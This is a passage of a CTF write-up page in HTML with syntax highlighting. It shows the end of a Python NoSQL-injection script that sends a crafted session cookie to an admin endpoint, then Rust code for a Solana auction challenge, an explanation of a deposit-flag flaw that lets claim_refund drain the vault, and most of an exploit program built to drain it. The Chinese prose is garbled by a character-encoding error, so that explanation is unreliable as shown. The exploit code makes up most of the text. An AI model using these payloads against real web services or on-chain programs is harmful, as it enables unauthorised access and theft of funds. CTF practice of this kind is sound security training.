Cookie value: j:&#123;"$ne":"x"&#125;</span>    cookies <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"sid"</span><span class="token punctuation">:</span> <span class="token string">'j:&#123;"$ne":"x"&#125;'</span><span class="token punctuation">&#125;</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] Sending malicious cookie to /admin..."</span><span class="token punctuation">)</span>    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>BASE_URL<span class="token punctuation">&#125;</span></span><span class="token string">/admin"</span></span><span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookies<span class="token punctuation">)</span>    <span class="token keyword">if</span> res<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+] Flag found: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[-] Failed. Status: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span>status_code<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    get_flag<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="Misc-Auction"><a href="#Misc-Auction" class="headerlink" title="Misc - Auction"></a>Misc - Auction</h1><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">if</span> auction_state<span class="token punctuation">.</span>ended <span class="token operator">==</span> <span class="token boolean">true</span>    <span class="token operator">&amp;&amp;</span> auction_state<span class="token punctuation">.</span>settled <span class="token operator">==</span> <span class="token boolean">true</span>    <span class="token operator">&amp;&amp;</span> auction_state<span class="token punctuation">.</span>highest_bidder <span class="token operator">==</span> player<span class="token punctuation">.</span><span class="token function">pubkey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token macro property">writeln!</span><span class="token punctuation">(</span>socket<span class="token punctuation">,</span> <span class="token string">"Auction ended! Here is your flag:"</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Ok</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token namespace">env<span class="token punctuation">::</span></span><span class="token function">var</span><span class="token punctuation">(</span><span class="token string">"FLAG"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token macro property">writeln!</span><span class="token punctuation">(</span>socket<span class="token punctuation">,</span> <span class="token string">"flag: &#123;:?&#125;"</span><span class="token punctuation">,</span> flag<span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token macro property">writeln!</span><span class="token punctuation">(</span>socket<span class="token punctuation">,</span> <span class="token string">"flag not found, please contact admin"</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token class-name">Ok</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æœåŠ¡ç«¯å¯åŠ¨ Solana&#x2F;Anchor ç¨‹åºå¹¶åˆå§‹åŒ–ä¸€åœºç®¡ç†å‘˜æ‹å–ï¼ˆbuy-now&#x3D;10 SOLï¼‰ï¼ŒéšååŠ è½½é€‰æ‰‹çš„Â solveÂ æŒ‡ä»¤æ‰§è¡Œã€‚flag æ¡ä»¶åªæœ‰å½“ç®¡ç†å‘˜æ‹å–çŠ¶æ€æ»¡è¶³ï¼š</p><ul><li>ended &#x3D;&#x3D; true</li><li>settled &#x3D;&#x3D; true</li><li>highest_bidder &#x3D;&#x3D; player</li></ul><p>é€‰æ‰‹èµ„é‡‘åˆå§‹ä¸è¶³ä»¥ç›´æ¥ 10 SOL ç»“ç®—ï¼Œéœ€è¦ä»ç³»ç»Ÿæˆ– vault ä¸­å¼„é’±</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token comment">/// Place or raise a bid. Only a single deposit is locked up front.</span><span class="token comment">/// If buy-now is reached, the auction ends immediately and an event is emitted.</span><span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">place_bid</span><span class="token punctuation">(</span>ctx<span class="token punctuation">:</span> <span class="token class-name">Context</span><span class="token operator">&lt;</span><span class="token class-name">PlaceBid</span><span class="token operator">></span><span class="token punctuation">,</span> bid_amount<span class="token punctuation">:</span> <span class="token keyword">u64</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Result</span><span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>    <span class="token macro property">require!</span><span class="token punctuation">(</span>bid_amount <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token class-name">ErrorCode</span><span class="token punctuation">::</span><span class="token class-name">InvalidBidAmount</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> auction <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>auction<span class="token punctuation">;</span>    <span class="token keyword">let</span> now <span class="token operator">=</span> <span class="token class-name">Clock</span><span class="token punctuation">::</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">.</span>unix_timestamp<span class="token punctuation">;</span>    <span class="token macro property">require!</span><span class="token punctuation">(</span>        <span class="token operator">!</span>auction<span class="token punctuation">.</span>ended <span class="token operator">&amp;&amp;</span> now <span class="token operator">&lt;</span> auction<span class="token punctuation">.</span>end_time<span class="token punctuation">,</span>        <span class="token class-name">ErrorCode</span><span class="token punctuation">::</span><span class="token class-name">AuctionAlreadyEnded</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token macro property">require!</span><span class="token punctuation">(</span>bid_amount <span class="token operator">>=</span> auction<span class="token punctuation">.</span>starting_bid<span class="token punctuation">,</span> <span class="token class-name">ErrorCode</span><span class="token punctuation">::</span><span class="token class-name">BidTooLow</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> auction<span class="token punctuation">.</span>highest_bid <span class="token operator">></span> <span class="token number">0</span> <span class="token punctuation">&#123;</span>        <span class="token macro property">require!</span><span class="token punctuation">(</span>            bid_amount <span class="token operator">>=</span> auction<span class="token punctuation">.</span>highest_bid<span class="token punctuation">.</span><span class="token function">saturating_add</span><span class="token punctuation">(</span>auction<span class="token punctuation">.</span>increment<span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token class-name">ErrorCode</span><span class="token punctuation">::</span><span class="token class-name">IncrementTooSmall</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// Pay deposit if required and not already paid.</span>    <span class="token keyword">let</span> bidder_state <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>bidder_state<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token operator">!</span>bidder_state<span class="token punctuation">.</span>deposit_paid <span class="token punctuation">&#123;</span>        <span class="token function">system_transfer</span><span class="token punctuation">(</span>            <span class="token class-name">CpiContext</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span>                ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>system_program<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token namespace">anchor_lang<span class="token punctuation">::</span>system_program<span class="token punctuation">::</span></span><span class="token class-name">Transfer</span> <span class="token punctuation">&#123;</span>                    from<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>bidder<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                    to<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>vault<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            <span class="token punctuation">)</span><span class="token punctuation">,</span>            auction<span class="token punctuation">.</span>deposit_amount<span class="token punctuation">,</span>        <span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>        bidder_state<span class="token punctuation">.</span>deposit_paid <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        auction<span class="token punctuation">.</span>deposit_count <span class="token operator">=</span> auction            <span class="token punctuation">.</span>deposit_count            <span class="token punctuation">.</span><span class="token function">checked_add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">ok_or</span><span class="token punctuation">(</span><span class="token class-name">ErrorCode</span><span class="token punctuation">::</span><span class="token class-name">MathOverflow</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    bidder_state<span class="token punctuation">.</span>bidder <span class="token operator">=</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>bidder<span class="token punctuation">.</span><span class="token function">key</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    bidder_state<span class="token punctuation">.</span>auction <span class="token operator">=</span> auction<span class="token punctuation">.</span><span class="token function">key</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    bidder_state<span class="token punctuation">.</span>refunded <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    bidder_state<span class="token punctuation">.</span>bump <span class="token operator">=</span> ctx<span class="token punctuation">.</span>bumps<span class="token punctuation">.</span>bidder_state<span class="token punctuation">;</span>    <span class="token comment">// Update auction high bid.</span>    auction<span class="token punctuation">.</span>highest_bid <span class="token operator">=</span> bid_amount<span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>auction<span class="token punctuation">.</span>buy_now_price<span class="token punctuation">)</span><span class="token punctuation">;</span>    auction<span class="token punctuation">.</span>highest_bidder <span class="token operator">=</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>bidder<span class="token punctuation">.</span><span class="token function">key</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// If buy-now reached, end immediately.</span>    <span class="token keyword">if</span> bid_amount <span class="token operator">>=</span> auction<span class="token punctuation">.</span>buy_now_price <span class="token punctuation">&#123;</span>        auction<span class="token punctuation">.</span>ended <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token class-name">Ok</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token comment">/// Losers reclaim their deposit (if any) after the auction ends.</span><span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">claim_refund</span><span class="token punctuation">(</span>ctx<span class="token punctuation">:</span> <span class="token class-name">Context</span><span class="token operator">&lt;</span><span class="token class-name">ClaimRefund</span><span class="token operator">></span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Result</span><span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> auction <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>auction<span class="token punctuation">;</span>    <span class="token macro property">require!</span><span class="token punctuation">(</span>auction<span class="token punctuation">.</span>ended<span class="token punctuation">,</span> <span class="token class-name">ErrorCode</span><span class="token punctuation">::</span><span class="token class-name">AuctionNotEnded</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token macro property">require!</span><span class="token punctuation">(</span>        auction<span class="token punctuation">.</span>highest_bidder <span class="token operator">!=</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>bidder<span class="token punctuation">.</span><span class="token function">key</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token class-name">ErrorCode</span><span class="token punctuation">::</span><span class="token class-name">WinnerMustClaimViaWinnerPath</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> bidder_state <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>bidder_state<span class="token punctuation">;</span>    <span class="token macro property">require!</span><span class="token punctuation">(</span><span class="token operator">!</span>bidder_state<span class="token punctuation">.</span>refunded<span class="token punctuation">,</span> <span class="token class-name">ErrorCode</span><span class="token punctuation">::</span><span class="token class-name">AlreadyRefunded</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token macro property">require!</span><span class="token punctuation">(</span>        auction<span class="token punctuation">.</span>deposit_amount <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">||</span> bidder_state<span class="token punctuation">.</span>deposit_paid<span class="token punctuation">,</span>        <span class="token class-name">ErrorCode</span><span class="token punctuation">::</span><span class="token class-name">DepositNotPaid</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token macro property">require!</span><span class="token punctuation">(</span>        bidder_state<span class="token punctuation">.</span>bidder <span class="token operator">==</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>bidder<span class="token punctuation">.</span><span class="token function">key</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token class-name">ErrorCode</span><span class="token punctuation">::</span><span class="token class-name">UnauthorizedBidderState</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token macro property">require!</span><span class="token punctuation">(</span>        bidder_state<span class="token punctuation">.</span>auction <span class="token operator">==</span> auction<span class="token punctuation">.</span><span class="token function">key</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token class-name">ErrorCode</span><span class="token punctuation">::</span><span class="token class-name">WrongAuction</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">transfer_from_vault</span><span class="token punctuation">(</span>        <span class="token operator">&amp;</span>ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>vault<span class="token punctuation">,</span>        <span class="token operator">&amp;</span>ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>bidder<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        auction<span class="token punctuation">.</span>deposit_amount<span class="token punctuation">,</span>        <span class="token operator">&amp;</span>ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>system_program<span class="token punctuation">,</span>        ctx<span class="token punctuation">.</span>bumps<span class="token punctuation">.</span>vault<span class="token punctuation">,</span>    <span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>    auction<span class="token punctuation">.</span>deposit_count <span class="token operator">=</span> auction<span class="token punctuation">.</span>deposit_count<span class="token punctuation">.</span><span class="token function">saturating_sub</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    bidder_state<span class="token punctuation">.</span>refunded <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token class-name">Ok</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åªè¦ <code>bidder_state.deposit_paid == false</code>ï¼Œå°±ä¼šä» bidder å‘ vault è½¬æŠ¼é‡‘<br>æŠ¼é‡‘æˆåŠŸåä»…ä¿®æ”¹ <code>deposit_paid = true</code>ï¼Œå¹¶ç´¯åŠ  <code>auction.deposit_count</code><br>ä½†åœ¨æ–°æ‹å–ä¸­ï¼ŒåŒä¸€ <code>bidder_state</code> åªè¦æ²¡è¢«é‡å»ºï¼Œå°±ä¸ä¼šè¢«é‡ç½®</p><p><code>claim_refund</code> åªæ ¡éªŒï¼š<code>auction.ended == true</code>ï¼Œ<code>bidder_state.deposit_paid == true</code>ï¼Œ<code>bidder_state.refunded == false</code>ï¼Œ<code>bidder_state</code> ä¸ <code>auction/bidder</code> åŒ¹é…</p><p>ä½†æ²¡æœ‰æ ¡éªŒè¯¥æ‹å–æ˜¯å¦çœŸçš„æ”¶è¿‡æŠ¼é‡‘ï¼Œä¹Ÿæ²¡æœ‰éªŒè¯ deposit_count æ˜¯å¦å¯¹åº”å®é™…è½¬å…¥</p><p>ä¸€æ—¦ deposit_paid åœ¨æŸæ¬¡æ‹å–é‡Œè¢«ç½®ä¸º trueï¼Œåç»­æ–°æ‹å–é‡ŒåŒä¸€ bidder_state å¯è·³è¿‡æŠ¼é‡‘æ”¯ä»˜ï¼Œä½† claim_refund ä»å…è®¸ä» vault å–å›æŠ¼é‡‘ã€‚</p><p>æ€è·¯ï¼š</p><p>åˆ›å»ºä¸€ä¸ªæå°é‡‘é¢æ‹å–ï¼Œåˆ†åˆ«è®© player å’Œ exploit_pda å‚ä¸ç«æ‹ï¼Œä½¿å…¶ deposit_paid &#x3D; trueã€‚<br>ä¹‹åå…³é—­æ‹å–ï¼Œé‡Šæ”¾æ‹å–è´¦æˆ·ï¼Œä½† bidder_state ä¿ç•™</p><p>ç„¶åä» vault æŠ½ SOLï¼Œè¶³å¤Ÿäº†ä¹‹åç›´æ¥ç»“ç®—ç®¡ç†å‘˜æ‹å–</p><p>lib.rsï¼Œç”¨äºç”Ÿæˆ exploit.so</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">use</span> <span class="token namespace">anchor_lang<span class="token punctuation">::</span>prelude<span class="token punctuation">::</span></span><span class="token operator">*</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token namespace">challenge<span class="token punctuation">::</span>cpi<span class="token punctuation">::</span>accounts<span class="token punctuation">::</span></span><span class="token punctuation">&#123;</span>    <span class="token class-name">ClaimRefund</span><span class="token punctuation">,</span> <span class="token class-name">ClaimWinner</span><span class="token punctuation">,</span> <span class="token class-name">CloseAuction</span><span class="token punctuation">,</span> <span class="token class-name">CreateAuction</span><span class="token punctuation">,</span> <span class="token class-name">PlaceBid</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token namespace">challenge<span class="token punctuation">::</span></span><span class="token punctuation">&#123;</span><span class="token keyword">self</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token macro property">declare_id!</span><span class="token punctuation">(</span><span class="token string">"22222222222222222222222222222222222222222522"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token attribute attr-name">#[program]</span><span class="token keyword">pub</span> <span class="token keyword">mod</span> <span class="token module-declaration namespace">exploit</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token keyword">super</span><span class="token punctuation">::</span><span class="token operator">*</span><span class="token punctuation">;</span>    <span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">solve</span><span class="token punctuation">(</span>ctx<span class="token punctuation">:</span> <span class="token class-name">Context</span><span class="token operator">&lt;</span><span class="token class-name">Solve</span><span class="token operator">></span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Result</span><span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> bump <span class="token operator">=</span> ctx<span class="token punctuation">.</span>bumps<span class="token punctuation">.</span>exploit_pda<span class="token punctuation">;</span>        <span class="token function">ensure_exploit_pda_funded</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>ctx<span class="token punctuation">,</span> bump<span class="token punctuation">,</span> <span class="token number">5_000_000</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>        <span class="token function">seed_deposit_flags</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>ctx<span class="token punctuation">,</span> bump<span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>        <span class="token function">drain_vault</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>ctx<span class="token punctuation">,</span> bump<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">50</span> <span class="token operator">*</span> <span class="token constant">LAMPORTS_PER_SOL</span><span class="token punctuation">,</span> <span class="token number">51</span> <span class="token operator">*</span> <span class="token constant">LAMPORTS_PER_SOL</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>        <span class="token function">win_admin_auction</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>ctx<span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>        <span class="token class-name">Ok</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">const</span> <span class="token constant">LAMPORTS_PER_SOL</span><span class="token punctuation">:</span> <span class="token keyword">u64</span> <span class="token operator">=</span> <span class="token number">1_000_000_000</span><span class="token punctuation">;</span><span class="token attribute attr-name">#[inline(never)]</span><span class="token keyword">fn</span> <span class="token function-definition function">ensure_exploit_pda_funded</span><span class="token punctuation">(</span>ctx<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token class-name">Context</span><span class="token operator">&lt;</span><span class="token class-name">Solve</span><span class="token operator">></span><span class="token punctuation">,</span> bump<span class="token punctuation">:</span> <span class="token keyword">u8</span><span class="token punctuation">,</span> lamports<span class="token punctuation">:</span> <span class="token keyword">u64</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Result</span><span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>exploit_pda<span class="token punctuation">.</span><span class="token function">lamports</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token class-name">Ok</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">let</span> seeds <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token punctuation">[</span><span class="token string">b"exploit"</span><span class="token punctuation">.</span><span class="token function">as_ref</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span><span class="token punctuation">[</span>bump<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> signer <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token punctuation">[</span><span class="token operator">&amp;</span>seeds<span class="token punctuation">[</span><span class="token punctuation">..</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> ix <span class="token operator">=</span> <span class="token namespace">anchor_lang<span class="token punctuation">::</span>solana_program<span class="token punctuation">::</span>system_instruction<span class="token punctuation">::</span></span><span class="token function">create_account</span><span class="token punctuation">(</span>        <span class="token operator">&amp;</span>ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>player<span class="token punctuation">.</span><span class="token function">key</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token operator">&amp;</span>ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>exploit_pda<span class="token punctuation">.</span><span class="token function">key</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        lamports<span class="token punctuation">,</span>        <span class="token number">0</span><span class="token punctuation">,</span>        <span class="token operator">&amp;</span>ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>system_program<span class="token punctuation">.</span><span class="token function">key</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token namespace">anchor_lang<span class="token punctuation">::</span>solana_program<span class="token punctuation">::</span>program<span class="token punctuation">::</span></span><span class="token function">invoke_signed</span><span class="token punctuation">(</span>        <span class="token operator">&amp;</span>ix<span class="token punctuation">,</span>        <span class="token operator">&amp;</span><span class="token punctuation">[</span>            ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>player<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>exploit_pda<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>system_program<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">]</span><span class="token punctuation">,</span>        signer<span class="token punctuation">,</span>    <span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>    <span class="token class-name">Ok</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token attribute attr-name">#[inline(never)]</span><span class="token keyword">fn</span> <span class="token function-definition function">seed_deposit_flags</span><span class="token punctuation">(</span>ctx<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token class-name">Context</span><span class="token operator">&lt;</span><span class="token class-name">Solve</span><span class="token operator">></span><span class="token punctuation">,</span> bump<span class="token punctuation">:</span> <span class="token keyword">u8</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Result</span><span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> <span class="token punctuation">(</span>end_time<span class="token punctuation">,</span> settlement_deadline<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">auction_times</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> exploit_seeds <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token punctuation">[</span><span class="token string">b"exploit"</span><span class="token punctuation">.</span><span class="token function">as_ref</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span><span class="token punctuation">[</span>bump<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> signer <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token punctuation">[</span><span class="token operator">&amp;</span>exploit_seeds<span class="token punctuation">[</span><span class="token punctuation">..</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">// Tiny auction to set deposit_paid=true for both bidder states.</span>    <span class="token keyword">let</span> cpi_create <span class="token operator">=</span> <span class="token class-name">CpiContext</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span>        ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>challenge_program<span 